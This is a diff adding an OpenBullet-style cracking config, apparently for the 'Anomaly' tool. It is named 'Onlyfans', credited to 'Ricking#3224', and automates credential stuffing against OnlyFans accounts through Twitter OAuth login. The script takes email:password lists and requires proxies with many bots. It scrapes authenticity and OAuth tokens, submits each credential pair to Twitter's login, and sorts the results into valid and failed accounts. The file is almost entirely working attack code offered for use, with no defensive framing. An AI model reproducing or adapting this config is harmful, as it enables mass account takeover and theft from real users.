@@ -1,0 +1,105 @@
+[SETTINGS]
+{
+  "Name": "Onlyfans",
+  "SuggestedBots": 150,
+  "MaxCPM": 0,
+  "LastModified": "2021-04-06T16:57:18.1381412+04:30",
+  "AdditionalInfo": "Ricking#3224",
+  "Author": "Ricking#3224",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+FUNCTION URLEncode "<USER>" -> VAR "US" 
+
+REQUEST GET "https://onlyfans.com/twitter/auth?csrf=kCuqz2GOb9e5470b99fa5ebf67684a83a07f84c1" AutoRedirect=FALSE 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+PARSE "<SOURCE>" LR "href=\"" "\">" -> VAR "URL" 
+
+REQUEST GET "<URL>" 
+  
+  HEADER "accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "accept-language: en-US;q=0.8,en;q=0.7" 
+  HEADER "eferer: https://onlyfans.com/" 
+  HEADER "sec-ch-ua: \"Google Chrome\";v=\"89\", \"Chromium\";v=\"89\", \";Not A Brand\";v=\"99\"" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "sec-fetch-dest: document" 
+  HEADER "sec-fetch-mode: navigate" 
+  HEADER "sec-fetch-site: cross-site" 
+  HEADER "sec-fetch-user: ?1" 
+  HEADER "upgrade-insecure-requests: 1" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36" 
+
+PARSE "<SOURCE>" LR "authenticity_token\" type=\"hidden\" value=\"" "\">" -> VAR "authenticity" 
+
+PARSE "<SOURCE>" LR "oauth_token=" "\"" -> VAR "token" 
+
+REQUEST POST "<URL>" 
+  CONTENT "authenticity_token=<authenticity>&redirect_after_login=https%3A%2F%2Fapi.twitter.com%2Foauth%2Fauthenticate%3Foauth_token%3D<token>&oauth_token=<token>&session%5Busername_or_email%5D=<US>&session%5Bpassword%5D=<PASS>&ui_metrics=%7B%22rf%22%3A%7B%22ab7b7908cc97cab147bff0d4595ca50f311768f6b7e3c800c6c7887c7c5c97a1%22%3A74%2C%22d7b37a1b8c885acb77d7359fe3cd755d17227373d5cc80eaaf49742415566b8c%22%3A148%2C%22a31f9eef5f51ec87ebeb03826581ba4660561aa9f25bedafc77b33f3c86eb57f%22%3A2%2C%22a2d55825fdc6a9da26ba5fb6f0cfb634a2107ca10a69168e0b15928e258dedb6%22%3A16%7D%2C%22s%22%3A%22l_SdZ-Qllw3tZ6rwSOgiD2LR_aUQGKz5X9nFYi92tyewo9KG2wumZ7XsxQ6SuNXRzaNjWLtaq3ztqRvaXxoISbRgcWPA30VmnfaYzyayfU5cjSH54F6R5t7WgTswcTKANGVcM9FXw--80PIdIjnqtsLFSumFudkfY4vW37E7U5r7euVqMvKa7JGpyN_oUW3heEW_2GfYEUw9e5lBBJ15MIze8Ijv7GB784zf2hvIFrExMDdT57IW10j4ZjJkf77-CRhwc9SsJuO5qpihz7M_gDgCcGbG41jZnq6peu-RV3ypwZTI2kdQ9s4e9fdoay8VzHevPeh3WvC7-trCo_b20gAAAXiKgRWc%22%7D" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "sec-ch-ua: \"Google Chrome\";v=\"89\", \"Chromium\";v=\"89\", \";Not A Brand\";v=\"99\"" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "sec-fetch-dest: document" 
+  HEADER "sec-fetch-mode: navigate" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "accept-language: en-US;q=0.8,en;q=0.7" 
+  HEADER "cache-control: max-age=0" 
+  HEADER "content-length: 1014" 
+  HEADER "content-type: application/x-www-form-urlencoded" 
+  HEADER "sec-fetch-site: same-origin" 
+  HEADER "sec-fetch-user: ?1" 
+  HEADER "upgrade-insecure-requests: 1" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "<ADDRESS>" Contains "https://twitter.com/login/error?username_or_email" 
+  KEYCHAIN Success OR 
+    KEY "<ADDRESS>" Contains "<URL>" 
+    KEY "<US>" Contains "Devilcracker0808%40gmail.com" 
+
